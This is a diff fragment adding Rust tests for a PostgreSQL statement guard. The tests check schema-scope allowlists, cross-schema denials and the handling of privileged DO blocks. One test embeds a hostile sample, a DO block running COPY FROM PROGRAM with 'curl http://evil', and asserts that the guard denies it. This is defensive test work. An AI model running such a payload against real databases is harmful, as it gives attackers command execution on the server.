+        let g = platform_guard();
+        assert!(
+            g.check(BOOTSTRAP_DO).is_ok(),
+            "0025 bootstrap DO should pass under Platform: {:?}",
+            g.check(BOOTSTRAP_DO)
+        );
+        assert!(
+            g.check(HYDRA_DO).is_ok(),
+            "0027 hydra DO should pass under Platform: {:?}",
+            g.check(HYDRA_DO)
+        );
+    }
+
+    #[test]
+    fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
+        let g = confined_guard();
+        assert!(is_denied(&g, BOOTSTRAP_DO), "0025 bootstrap DO must DENY under Confined");
+        assert!(is_denied(&g, HYDRA_DO), "0027 hydra DO must DENY under Confined");
+    }
+
+    #[test]
+    fn t4b_neg_do_block_rce_denied_even_under_platform() {
+        let g = platform_guard();
+        let rce_do = "DO $$ BEGIN
+            EXECUTE 'COPY zeroship.t FROM PROGRAM ''curl http://evil''';
+        END $$;";
+        assert!(
+            is_denied(&g, rce_do),
+            "COPY…PROGRAM in a body MUST deny even under Platform"
+        );
+    }
+
+    // ---- T2: SchemaScope Single is byte-identical at the read sites ---------
+
+    #[test]
+    fn t2_func_def_target_single_is_byte_identical() {
+        let g = confined_guard(); // Single("zeroship")
+        // own-schema funcname → OK; foreign funcname → CrossSchema.
+        assert!(g
+            .check("CREATE FUNCTION zeroship.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
+            .is_ok());
+        assert!(matches!(
+            g.check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$"),
+            Err(GuardError::CrossSchema { .. })
+        ));
+        assert!(matches!(
+            g.check("ALTER FUNCTION control.f() IMMUTABLE"),
+            Err(GuardError::CrossSchema { .. })
+        ));
+    }
+
+    #[test]
+    fn t2_literal_schema_refs_single_is_byte_identical() {
+        let g = confined_guard(); // Single("zeroship")
+        assert!(matches!(
+            g.check("SELECT 'control.t'::regclass"),
+            Err(GuardError::CrossSchema { .. })
+        ));
+        assert!(matches!(
+            g.check("SELECT nextval('control.s')"),
+            Err(GuardError::CrossSchema { .. })
+        ));
+        // own-schema literal ref → OK.
+        assert!(g.check("SELECT nextval('zeroship.s')").is_ok());
+    }
+
+    #[test]
+    fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
+        let g = platform_guard(); // Allowlist(zeroship, oauth_hydra, public)
+        // allowlisted schema → OK
+        assert!(g
+            .check("CREATE FUNCTION oauth_hydra.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
+            .is_ok());
+        assert!(g.check("SELECT nextval('oauth_hydra.s')").is_ok());
+        // non-allowlisted (creator) schema → still CrossSchema
+        assert!(matches!(
+            g.check("SELECT 'proj_acme.t'::regclass"),
+            Err(GuardError::CrossSchema { .. })
+        ));
+    }
+
+    #[test]
+    fn schema_scope_permits_is_case_insensitive() {
+        assert!(SchemaScope::Single("Zeroship".into()).permits("zeroship"));
+        assert!(SchemaScope::Allowlist(vec!["OAuth_Hydra".into()]).permits("oauth_hydra"));
+        assert!(!SchemaScope::Single("zeroship".into()).permits("control"));
+    }
 }
